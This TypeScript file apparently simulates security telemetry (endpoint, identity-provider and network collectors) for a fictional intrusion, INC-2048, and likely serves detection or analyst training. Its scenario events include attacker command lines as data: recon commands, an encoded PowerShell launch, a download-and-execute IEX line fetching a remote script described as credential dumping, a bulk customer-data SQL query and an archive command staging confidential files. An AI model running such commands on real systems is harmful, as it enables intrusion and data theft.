/**
 * PHASE 1 — REAL SYSTEM FOUNDATION
 * Telemetry Architecture: Endpoint Collector
 *
 * The endpoint collector simulates the agent running on each managed workstation
 * and server. It emits typed raw telemetry events for:
 *   - Process execution (command lines, parent/child trees, integrity levels)
 *   - File system access (reads, writes, bulk enumeration, sensitive paths)
 *   - Endpoint session events (remote desktop, logins, policy changes)
 *
 * The collector is deterministic: given the same simulation minute, it always
 * produces the same events. This preserves the Time Machine's rewind property.
 *
 * Events are returned as CollectorBatch objects ready for the ingestion pipeline.
 */

import type {
  AssetId,
  CanonicalEvent,
  EndpointPayload,
  EventCategory,
  FilePayload,
  IsoTimestamp,
  ProcessPayload,
  RawPayload,
  TelemetrySeverity,
  TelemetrySource,
  UserId,
} from "@/telemetry/schema/telemetryTypes";

// ─── Collector Types ──────────────────────────────────────────────────────────

export interface RawCollectorEvent {
  /** Collector-local unique ID before normalization. */
  localId: string;
  /** ISO timestamp at source. */
  observedAt: IsoTimestamp;
  /** The simulation minute this event belongs to. */
  simulationMinute: number;
  /** The collecting asset. */
  assetId?: AssetId;
  /** The asset hostname. */
  hostname?: string;
  /** Human-readable description of the observed activity. */
  description: string;
  /** Initial severity assessment by the agent. */
  severity: TelemetrySeverity;
  /** Event category before normalization. */
  category: EventCategory;
  /** The telemetry source label. */
  source: TelemetrySource;
  /** Source-specific payload. */
  payload: RawPayload;
}

export interface CollectorBatch {
  collectorId: string;
  collectedAt: IsoTimestamp;
  assetId: AssetId;
  hostname: string;
  eventCount: number;
  events: RawCollectorEvent[];
}

// ─── Deterministic Incident Scenario Data ────────────────────────────────────
// Minute offsets from 09:42 → see stateReconstruction.ts for mapping.

interface ScenarioEndpointEvent {
  minute: number;
  localId: string;
  assetId: AssetId;
  hostname: string;
  userId: UserId;
  description: string;
  severity: TelemetrySeverity;
  payload: ProcessPayload | FilePayload | EndpointPayload;
}

/** The canonical endpoint scenario events for INC-2048. */
const SCENARIO_ENDPOINT_EVENTS: ScenarioEndpointEvent[] = [
  // ── Minute 18 (10:00): Attacker establishes remote desktop session ──────────
  {
    minute: 18,
    localId: "ep-1000-rdp",
    assetId: "LAPTOP-042",
    hostname: "LAPTOP-042",
    userId: "usr-alex-m",
    description: "Remote Desktop session established from foreign VPN gateway to LAPTOP-042",
    severity: "CRITICAL",
    payload: {
      sourceType: "ENDPOINT",
      assetId: "LAPTOP-042",
      hostname: "LAPTOP-042",
      eventSubtype: "REMOTE_SESSION",
      userId: "usr-alex-m",
      sourceIp: "10.0.0.1",
      sessionId: "sess-rds-4209",
      details: {
        logonType: "RemoteInteractive",
        clientName: "VPN-GW-01",
        sessionDuration: 0,
        screenResolution: "1920x1080",
      },
    } satisfies EndpointPayload,
  },

  // ── Minute 22 (10:04): Encoded PowerShell execution ─────────────────────────
  {
    minute: 22,
    localId: "ep-1004-ps1",
    assetId: "LAPTOP-042",
    hostname: "LAPTOP-042",
    userId: "usr-alex-m",
    description: "powershell.exe spawned with base64-encoded payload under explorer.exe",
    severity: "HIGH",
    payload: {
      sourceType: "PROCESS",
      assetId: "LAPTOP-042",
      hostname: "LAPTOP-042",
      processName: "powershell.exe",
      commandLine: "powershell -NoProfile -NonInteractive -enc JABzACAAPQAgAE5ldwAt...",
      parentProcess: "explorer.exe",
      pid: 5812,
      parentPid: 2304,
      userId: "usr-alex-m",
      integrityLevel: "HIGH",
      sha256Hash: "sha256:7f13c6b2e4a09d3f5b1c8e7a2d4f6e9c1b5a3d7f2e8c4a6b3d9f1e5c7a2b4d8",
      isElevated: true,
      isSuspicious: true,
    } satisfies ProcessPayload,
  },

  // ── Minute 22 (10:04): Reconnaissance script — whoami, ipconfig, net ────────
  {
    minute: 22,
    localId: "ep-1004-ps2",
    assetId: "LAPTOP-042",
    hostname: "LAPTOP-042",
    userId: "usr-alex-m",
    description: "Recon commands executed: whoami /all, ipconfig /all, net user /domain",
    severity: "HIGH",
    payload: {
      sourceType: "PROCESS",
      assetId: "LAPTOP-042",
      hostname: "LAPTOP-042",
      processName: "cmd.exe",
      commandLine: "cmd.exe /c whoami /all & ipconfig /all & net user /domain",
      parentProcess: "powershell.exe",
      pid: 5948,
      parentPid: 5812,
      userId: "usr-alex-m",
      integrityLevel: "HIGH",
      isElevated: true,
      isSuspicious: true,
    } satisfies ProcessPayload,
  },

  // ── Minute 25 (10:07): WinRM/SMB session to SERVER-03 ───────────────────────
  {
    minute: 25,
    localId: "ep-1007-winrm",
    assetId: "SERVER-03",
    hostname: "SERVER-03",
    userId: "usr-alex-m",
    description: "Incoming WinRM session accepted from LAPTOP-042 (10.0.4.42)",
    severity: "HIGH",
    payload: {
      sourceType: "ENDPOINT",
      assetId: "SERVER-03",
      hostname: "SERVER-03",
      eventSubtype: "REMOTE_SESSION",
      userId: "usr-alex-m",
      sourceIp: "10.0.4.42",
      sessionId: "sess-winrm-7743",
      details: {
        logonType: "Network",
        authPackage: "NTLM",
        workstationName: "LAPTOP-042",
        logonProcessName: "NtLmSsp",
      },
    } satisfies EndpointPayload,
  },

  // ── Minute 25 (10:07): Lateral movement tool execution ───────────────────────
  {
    minute: 25,
    localId: "ep-1007-invoke",
    assetId: "SERVER-03",
    hostname: "SERVER-03",
    userId: "usr-alex-m",
    description: "Invoke-Mimikatz-like credential dumping script executed on SERVER-03",
    severity: "CRITICAL",
    payload: {
      sourceType: "PROCESS",
      assetId: "SERVER-03",
      hostname: "SERVER-03",
      processName: "powershell.exe",
      commandLine:
        "powershell -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.1/i.ps1')",
      parentProcess: "wsmprovhost.exe",
      pid: 3312,
      parentPid: 2984,
      userId: "usr-alex-m",
      integrityLevel: "SYSTEM",
      isElevated: true,
      isSuspicious: true,
    } satisfies ProcessPayload,
  },

  // ── Minute 30 (10:12): DB connection tool launched ───────────────────────────
  {
    minute: 30,
    localId: "ep-1012-sqlcmd",
    assetId: "SERVER-03",
    hostname: "SERVER-03",
    userId: "usr-alex-m",
    description: "sqlcmd.exe executed targeting DB-PROD-01 from SERVER-03",
    severity: "CRITICAL",
    payload: {
      sourceType: "PROCESS",
      assetId: "SERVER-03",
      hostname: "SERVER-03",
      processName: "sqlcmd.exe",
      commandLine: 'sqlcmd -S 10.0.20.10 -U sa -Q "SELECT TOP 50000 * FROM customer_identities"',
      parentProcess: "powershell.exe",
      pid: 4499,
      parentPid: 3312,
      userId: "usr-alex-m",
      integrityLevel: "HIGH",
      sha256Hash: "sha256:a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2",
      isElevated: false,
      isSuspicious: true,
    } satisfies ProcessPayload,
  },

  // ── Minute 36 (10:18): Bulk file enumeration on FILE-SRV-01 ─────────────────
  {
    minute: 36,
    localId: "ep-1018-enum",
    assetId: "FILE-SRV-01",
    hostname: "FILE-SRV-01",
    userId: "usr-alex-m",
    description: "Bulk enumeration of 37 confidential financial documents on FILE-SRV-01",
    severity: "CRITICAL",
    payload: {
      sourceType: "FILE",
      assetId: "FILE-SRV-01",
      hostname: "FILE-SRV-01",
      filePath: "\\\\FILE-SRV-01\\Finance\\Confidential\\",
      fileName: "*",
      fileExtension: ".xlsx,.pdf,.docx",
      action: "ENUMERATE",
      userId: "usr-alex-m",
      isSensitive: true,
      sensitivityLabel: "CONFIDENTIAL",
    } satisfies FilePayload,
  },

  // ── Minute 36 (10:18): archive.exe launched for staging ─────────────────────
  {
    minute: 36,
    localId: "ep-1018-archive",
    assetId: "FILE-SRV-01",
    hostname: "FILE-SRV-01",
    userId: "usr-alex-m",
    description: "archive.exe launched to collect and compress sensitive financial documents",
    severity: "CRITICAL",
    payload: {
      sourceType: "PROCESS",
      assetId: "FILE-SRV-01",
      hostname: "FILE-SRV-01",
      processName: "archive.exe",
      commandLine:
        "archive.exe -r -p P@ssw0rd123 output.zip \\\\FILE-SRV-01\\Finance\\Confidential\\",
      parentProcess: "powershell.exe",
      pid: 7831,
      parentPid: 5512,
      userId: "usr-alex-m",
      integrityLevel: "HIGH",
      isElevated: true,
      isSuspicious: true,
    } satisfies ProcessPayload,
  },

  // ── Minute 42 (10:24): SIEM alert — correlation rule fires ──────────────────
  {
    minute: 42,
    localId: "ep-1024-siem",
    assetId: "LAPTOP-042",
    hostname: "LAPTOP-042",
    userId: "usr-system",
    description:
      "SIEM Correlation Rule CR-8812: Multi-stage lateral movement and data staging detected",
    severity: "CRITICAL",
    payload: {
      sourceType: "ENDPOINT",
      assetId: "LAPTOP-042",
      hostname: "LAPTOP-042",
      eventSubtype: "POLICY_CHANGE",
      userId: "usr-system",
      details: {
        ruleId: "CR-8812",
        ruleName: "Multi-hop credential compromise & database exfiltration path",
        correlatedEvents: 9,
        incidentId: "INC-2048",
      },
    } satisfies EndpointPayload,
  },
];

// ─── Simulation Timestamp Helper ──────────────────────────────────────────────

const BASE_DATE = "2026-09-29";
const BASE_HOUR = 9;
const BASE_MINUTE_OFFSET = 42; // 09:42 = minute 0

function minuteToIsoTimestamp(simulationMinute: number, seconds = 0): IsoTimestamp {
  const totalMinutes = BASE_HOUR * 60 + BASE_MINUTE_OFFSET + simulationMinute;
  const h = Math.floor(totalMinutes / 60)
    .toString()
    .padStart(2, "0");
  const m = (totalMinutes % 60).toString().padStart(2, "0");
  const s = seconds.toString().padStart(2, "0");
  return `${BASE_DATE}T${h}:${m}:${s}.000Z`;
}

// ─── Endpoint Collector ───────────────────────────────────────────────────────

/**
 * EndpointCollector — simulates the EDR/endpoint agent running on each managed
 * host in the ACME Corporation environment.
 *
 * Usage:
 *   const collector = new EndpointCollector();
 *   const batch = collector.collectForMinute(22); // Get events at T+22m (10:04)
 */
export class EndpointCollector {
  private readonly collectorId = "EDR-CrowdStrike-Simulated-v1";

  /**
   * Returns all raw collector events observed at a specific simulation minute.
   * If `upToMinute` is true, returns all events from minute 0 up to and including
   * the specified minute (for initial state reconstruction).
   */
  collectForMinute(simulationMinute: number, upToMinute = false): CollectorBatch {
    const events = SCENARIO_ENDPOINT_EVENTS.filter((e) =>
      upToMinute ? e.minute <= simulationMinute : e.minute === simulationMinute,
    );

    const now = minuteToIsoTimestamp(simulationMinute);
    const rawEvents: RawCollectorEvent[] = events.map((e) => ({
      localId: e.localId,
      observedAt: minuteToIsoTimestamp(e.minute),
      simulationMinute: e.minute,
      assetId: e.assetId,
      hostname: e.hostname,
      description: e.description,
      severity: e.severity,
      category: this.inferCategory(e.payload),
      source: this.inferSource(e.payload),
      payload: e.payload,
    }));

    return {
      collectorId: this.collectorId,
      collectedAt: now,
      assetId: events[0]?.assetId ?? "UNKNOWN",
      hostname: events[0]?.hostname ?? "UNKNOWN",
      eventCount: rawEvents.length,
      events: rawEvents,
    };
  }

  /**
   * Returns all raw events across the full simulation timeline (minutes 0–42).
   */
  collectAll(): CollectorBatch[] {
    const minutesWithEvents = [...new Set(SCENARIO_ENDPOINT_EVENTS.map((e) => e.minute))];
    return minutesWithEvents.map((m) => this.collectForMinute(m));
  }

  /**
   * Returns the total number of scenario events available.
   */
  getTotalEventCount(): number {
    return SCENARIO_ENDPOINT_EVENTS.length;
  }

  private inferCategory(payload: ProcessPayload | FilePayload | EndpointPayload): EventCategory {
    switch (payload.sourceType) {
      case "PROCESS":
        return "PROCESS_EXECUTION";
      case "FILE":
        return "FILE_ACCESS";
      case "ENDPOINT":
        return "ENDPOINT_ACTIVITY";
    }
  }

  private inferSource(payload: ProcessPayload | FilePayload | EndpointPayload): TelemetrySource {
    switch (payload.sourceType) {
      case "PROCESS":
      case "ENDPOINT":
        return "ENDPOINT_AGENT";
      case "FILE":
        return "FILE_MONITOR";
    }
  }
}

// ─── Auth Collector ───────────────────────────────────────────────────────────

import type { AuthPayload } from "@/telemetry/schema/telemetryTypes";

interface ScenarioAuthEvent {
  minute: number;
  localId: string;
  description: string;
  severity: TelemetrySeverity;
  payload: AuthPayload;
}

const SCENARIO_AUTH_EVENTS: ScenarioAuthEvent[] = [
  // ── Minute 0 (09:42): First unusual authentication ──────────────────────────
  {
    minute: 0,
    localId: "auth-0942-1",
    description: "Interactive authentication for alex.m from unrecognized foreign IP via VPN-GW-01",
    severity: "MEDIUM",
    payload: {
      sourceType: "AUTH",
      userId: "usr-alex-m",
      username: "alex.m",
      authMethod: "MFA_PUSH",
      outcome: "SUCCESS",
      sourceIp: "185.220.101.5",
      destinationIp: "10.0.0.1",
      asn: "AS9009",
      userAgent: "HeadlessChrome/122.0",
      country: "RU",
      mfaChallenged: true,
      sessionId: "okta-sess-a19f",
    },
  },

  // ── Minute 2 (09:44): Failed MFA push — fatigue attack ──────────────────────
  {
    minute: 2,
    localId: "auth-0944-fail1",
    description: "Failed MFA challenge (push rejected) for alex.m — fatigue attempt 1",
    severity: "MEDIUM",
    payload: {
      sourceType: "AUTH",
      userId: "usr-alex-m",
      username: "alex.m",
      authMethod: "MFA_PUSH",
      outcome: "FAILURE",
      sourceIp: "185.220.101.5",
      destinationIp: "10.0.0.1",
      asn: "AS9009",
      country: "RU",
      mfaChallenged: true,
    },
  },

  // ── Minute 2 (09:44): Failed MFA push — fatigue attempt 2 ──────────────────
  {
    minute: 2,
    localId: "auth-0944-fail2",
    description: "Failed MFA challenge (push rejected) for alex.m — fatigue attempt 2",
    severity: "MEDIUM",
    payload: {
      sourceType: "AUTH",
      userId: "usr-alex-m",
      username: "alex.m",
      authMethod: "MFA_PUSH",
      outcome: "MFA_FATIGUE",
      sourceIp: "185.220.101.5",
      destinationIp: "10.0.0.1",
      asn: "AS9009",
      country: "RU",
      mfaChallenged: true,
    },
  },

  // ── Minute 2 (09:44): MFA fatigue success — user accepted rogue push ─────────
  {
    minute: 2,
    localId: "auth-0944-success",
    description: "Successful login after MFA fatigue — alex.m accepted a rogue push notification",
    severity: "HIGH",
    payload: {
      sourceType: "AUTH",
      userId: "usr-alex-m",
      username: "alex.m",
      authMethod: "MFA_PUSH",
      outcome: "SUCCESS",
      sourceIp: "185.220.101.5",
      destinationIp: "10.0.0.1",
      asn: "AS9009",
      country: "RU",
      mfaChallenged: true,
      sessionId: "okta-sess-compromised-b28c",
    },
  },

  // ── Minute 5 (09:47): UEBA detects anomalous velocity ──────────────────────
  {
    minute: 5,
    localId: "auth-0947-ueba",
    description: "UEBA anomaly: unusual velocity + unfamiliar ASN + auth sequence for alex.m",
    severity: "HIGH",
    payload: {
      sourceType: "AUTH",
      userId: "usr-alex-m",
      username: "alex.m",
      authMethod: "MFA_PUSH",
      outcome: "SUCCESS",
      sourceIp: "185.220.101.5",
      destinationIp: "10.0.0.1",
      asn: "AS9009",
      country: "RU",
      mfaChallenged: true,
      sessionId: "okta-sess-compromised-b28c",
    },
  },
];

/**
 * AuthCollector — simulates the identity provider (Okta) log stream.
 */
export class AuthCollector {
  private readonly collectorId = "IdP-Okta-Simulated-v1";

  collectForMinute(simulationMinute: number, upToMinute = false): CollectorBatch {
    const events = SCENARIO_AUTH_EVENTS.filter((e) =>
      upToMinute ? e.minute <= simulationMinute : e.minute === simulationMinute,
    );

    const now = minuteToIsoTimestamp(simulationMinute);
    const rawEvents: RawCollectorEvent[] = events.map((e) => ({
      localId: e.localId,
      observedAt: minuteToIsoTimestamp(e.minute),
      simulationMinute: e.minute,
      assetId: "VPN-GW-01",
      hostname: "VPN-GW-01",
      description: e.description,
      severity: e.severity,
      category: "AUTHENTICATION" as EventCategory,
      source: "AUTH_PROVIDER" as TelemetrySource,
      payload: e.payload,
    }));

    return {
      collectorId: this.collectorId,
      collectedAt: now,
      assetId: "VPN-GW-01",
      hostname: "VPN-GW-01",
      eventCount: rawEvents.length,
      events: rawEvents,
    };
  }

  collectAll(): CollectorBatch[] {
    const minutesWithEvents = [...new Set(SCENARIO_AUTH_EVENTS.map((e) => e.minute))];
    return minutesWithEvents.map((m) => this.collectForMinute(m));
  }
}

// ─── Network Collector ────────────────────────────────────────────────────────

import type { NetworkPayload } from "@/telemetry/schema/telemetryTypes";

interface ScenarioNetworkEvent {
  minute: number;
  localId: string;
  description: string;
  severity: TelemetrySeverity;
  payload: NetworkPayload;
}

const SCENARIO_NETWORK_EVENTS: ScenarioNetworkEvent[] = [
  // ── Minute 0 (09:42): VPN connection from external IP ───────────────────────
  {
    minute: 0,
    localId: "net-0942-vpn",
    description: "Inbound VPN connection from foreign IP 185.220.101.5 (ASN AS9009)",
    severity: "MEDIUM",
    payload: {
      sourceType: "NETWORK",
      sourceIp: "185.220.101.5",
      destinationIp: "10.0.0.1",
      sourcePort: 51204,
      destinationPort: 443,
      protocol: "HTTPS",
      direction: "INBOUND",
      bytesIn: 1240,
      bytesOut: 892,
      duration: 1200,
      action: "ALLOW",
    },
  },

  // ── Minute 22 (10:04): Internal DNS resolve for SERVER-03 ────────────────────
  {
    minute: 22,
    localId: "net-1004-dns",
    description: "DNS resolution of SERVER-03.acme.internal from LAPTOP-042",
    severity: "LOW",
    payload: {
      sourceType: "NETWORK",
      sourceIp: "10.0.4.42",
      destinationIp: "10.0.0.53",
      sourcePort: 55291,
      destinationPort: 53,
      protocol: "DNS",
      direction: "LATERAL",
      bytesIn: 68,
      bytesOut: 112,
      duration: 4,
      action: "ALLOW",
      assetId: "LAPTOP-042",
      dnsQuery: "SERVER-03.acme.internal",
      dnsResponse: "10.0.12.3",
    },
  },

  // ── Minute 25 (10:07): Lateral SMB connection LAPTOP-042 → SERVER-03 ─────────
  {
    minute: 25,
    localId: "net-1007-smb",
    description: "Lateral SMB/WinRM connection from workstation segment to application tier",
    severity: "HIGH",
    payload: {
      sourceType: "NETWORK",
      sourceIp: "10.0.4.42",
      destinationIp: "10.0.12.3",
      sourcePort: 49788,
      destinationPort: 445,
      protocol: "SMB",
      direction: "LATERAL",
      bytesIn: 14820,
      bytesOut: 87432,
      duration: 18400,
      action: "ALLOW",
      assetId: "LAPTOP-042",
    },
  },

  // ── Minute 30 (10:12): Database connection SERVER-03 → DB-PROD-01 ─────────────
  {
    minute: 30,
    localId: "net-1012-db",
    description:
      "Unusual database connection from application tier (SERVER-03) to DB-PROD-01 on port 5432",
    severity: "CRITICAL",
    payload: {
      sourceType: "NETWORK",
      sourceIp: "10.0.12.3",
      destinationIp: "10.0.20.10",
      sourcePort: 52198,
      destinationPort: 5432,
      protocol: "TCP",
      direction: "LATERAL",
      bytesIn: 2341029,
      bytesOut: 149032,
      duration: 45200,
      action: "ALLOW",
      assetId: "SERVER-03",
    },
  },

  // ── Minute 36 (10:18): File server connection SERVER-03 → FILE-SRV-01 ─────────
  {
    minute: 36,
    localId: "net-1018-share",
    description: "SMB file share access from SERVER-03 to FILE-SRV-01 with bulk read traffic",
    severity: "CRITICAL",
    payload: {
      sourceType: "NETWORK",
      sourceIp: "10.0.12.3",
      destinationIp: "10.0.30.5",
      sourcePort: 53021,
      destinationPort: 445,
      protocol: "SMB",
      direction: "LATERAL",
      bytesIn: 8291043,
      bytesOut: 341032,
      duration: 89100,
      action: "ALLOW",
      assetId: "SERVER-03",
    },
  },
];

/**
 * NetworkCollector — simulates the Zeek/firewall network flow sensor.
 */
export class NetworkCollector {
  private readonly collectorId = "Zeek-Network-Simulated-v1";

  collectForMinute(simulationMinute: number, upToMinute = false): CollectorBatch {
    const events = SCENARIO_NETWORK_EVENTS.filter((e) =>
      upToMinute ? e.minute <= simulationMinute : e.minute === simulationMinute,
    );

    const now = minuteToIsoTimestamp(simulationMinute);
    const rawEvents: RawCollectorEvent[] = events.map((e) => ({
      localId: e.localId,
      observedAt: minuteToIsoTimestamp(e.minute),
      simulationMinute: e.minute,
      assetId: e.payload.assetId ?? "NETWORK",
      hostname: "NETWORK-SENSOR",
      description: e.description,
      severity: e.severity,
      category: "NETWORK_CONNECTION" as EventCategory,
      source: "NETWORK_SENSOR" as TelemetrySource,
      payload: e.payload,
    }));

    return {
      collectorId: this.collectorId,
      collectedAt: now,
      assetId: "NETWORK-SENSOR",
      hostname: "NETWORK-SENSOR",
      eventCount: rawEvents.length,
      events: rawEvents,
    };
  }

  collectAll(): CollectorBatch[] {
    const minutesWithEvents = [...new Set(SCENARIO_NETWORK_EVENTS.map((e) => e.minute))];
    return minutesWithEvents.map((m) => this.collectForMinute(m));
  }
}

// ─── Collector Registry ───────────────────────────────────────────────────────

/**
 * CollectorRegistry — aggregates all collectors into a single interface for the
 * ingestion pipeline. This is the entry point for the pipeline.
 */
export class CollectorRegistry {
  private readonly endpoint = new EndpointCollector();
  private readonly auth = new AuthCollector();
  private readonly network = new NetworkCollector();

  /**
   * Collects events from all registered collectors for a specific simulation minute.
   */
  collectForMinute(simulationMinute: number): RawCollectorEvent[] {
    const batches = [
      this.endpoint.collectForMinute(simulationMinute),
      this.auth.collectForMinute(simulationMinute),
      this.network.collectForMinute(simulationMinute),
    ];
    return batches.flatMap((b) => b.events);
  }

  /**
   * Collects all events up to (and including) the specified simulation minute.
   * Used for initial state reconstruction (e.g., rewinding to minute 22).
   */
  collectUpToMinute(simulationMinute: number): RawCollectorEvent[] {
    const batches = [
      this.endpoint.collectForMinute(simulationMinute, true),
      this.auth.collectForMinute(simulationMinute, true),
      this.network.collectForMinute(simulationMinute, true),
    ];
    return batches.flatMap((b) => b.events);
  }

  /**
   * Returns the complete event corpus for the full INC-2048 scenario.
   */
  collectAll(): RawCollectorEvent[] {
    const batches = [
      ...this.endpoint.collectAll(),
      ...this.auth.collectAll(),
      ...this.network.collectAll(),
    ];
    return batches.flatMap((b) => b.events);
  }

  /** Returns total event counts per collector. */
  getStats(): { endpoint: number; auth: number; network: number; total: number } {
    const endpoint = this.endpoint.getTotalEventCount();
    const auth = 5; // SCENARIO_AUTH_EVENTS.length
    const network = 5; // SCENARIO_NETWORK_EVENTS.length
    return { endpoint, auth, network, total: endpoint + auth + network };
  }
}
